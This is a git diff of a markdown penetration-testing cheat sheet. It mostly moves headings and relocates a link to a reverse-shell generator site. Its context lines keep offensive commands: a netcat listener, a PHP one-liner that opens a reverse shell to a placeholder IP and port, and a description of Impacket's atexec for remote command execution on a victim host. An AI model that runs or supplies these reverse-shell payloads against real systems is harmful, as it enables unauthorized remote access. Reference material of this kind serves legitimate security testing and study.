@@ -839,7 +839,13 @@ ls -alhR /opt/lampp/htdocs/ 2>/dev/null
 
 # Reverse Shell
 
-## NC Listen - Client [STEP 1]
+<br />
+
+[Reverse Shell Generator](https://www.revshells.com/)
+
+<br />
+
+#### NC Listen - Client [STEP 1]
 
 <br />
 
@@ -854,7 +860,7 @@ sudo nc -lnvp {PORT}
 ```
 <br />
 
-## NC Execute - Server [STEP 2]
+#### NC Execute - Server [STEP 2]
 
 ```bash
 # With netcat installed
@@ -888,7 +894,7 @@ php -r ‘$sock=fsockopen(“{IP ADDRESS}”,{PORT});exec(“/bin/sh -i <&3 >&3 
 ```
 <br />
  
-### Impacket Remote Code Execution
+#### Impacket Remote Code Execution
 
 ```bash
 # atexec.py : Atexec.py: Impacket has a python library that helps an attacker to access the victim host machine remotely through DCE/RPC based protocol used by CIFS hosts to access/control the AT-Scheduler Service and execute the arbitrary system command.
@@ -909,20 +915,7 @@ php -r ‘$sock=fsockopen(“{IP ADDRESS}”,{PORT});exec(“/bin/sh -i <&3 >&3 
 # {IP ADDRESS}: Server IP address
 ```
 
-
-## Reverse Shell Generator
-
-<br />
-
-[Reverse Shell Generator](https://www.revshells.com/)
-
-<br />
-
 # Shell Upgrade
-
-<br />
-
-## Python
 
 <br />
 
